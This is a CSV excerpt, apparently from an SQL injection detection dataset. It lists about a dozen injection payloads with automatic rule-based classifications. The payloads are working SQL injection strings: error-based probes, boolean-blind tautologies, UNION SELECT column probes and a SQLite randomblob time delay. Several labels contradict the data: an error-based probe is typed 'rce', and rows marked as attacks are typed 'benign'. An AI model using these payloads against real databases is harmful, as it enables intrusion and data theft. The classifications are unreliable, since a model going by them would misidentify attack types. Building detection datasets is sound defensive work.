row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
9150,"1, ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 9693 = 9693,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
9151,"1' ) where 2284 = 2284 and make_set ( 8403 = 8403,8899 ) --",1,,boolean_blind,generic,0.95,2284 = 2284 and detected — boolean_blind injection (priority 8) on generic,rule-based
9152,-6014' ) ) or ( 9860 = 4848 ) *4848 and ( ( 'qtge' = 'qtge,1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
9153,select case when 4656 = 3716 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9154,"1"" where 8571 = 8571",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9155,"1"" ) and 3732 = 3850 and ( ""edjv"" = ""edjv",1,,boolean_blind,generic,0.95,3732 = 3850 and detected — boolean_blind injection (priority 8) on generic,rule-based
9156,end#,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
9157,1' ) ) union all select null#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9158,"1"" ) ) and 7656 = 5604 and ( ( ""zuhv"" = ""zuhv",1,,boolean_blind,generic,0.95,7656 = 5604 and detected — boolean_blind injection (priority 8) on generic,rule-based
9159,"1 ) ) as llnm where 6510 = 6510 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
9160,"1"" ) union all select null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
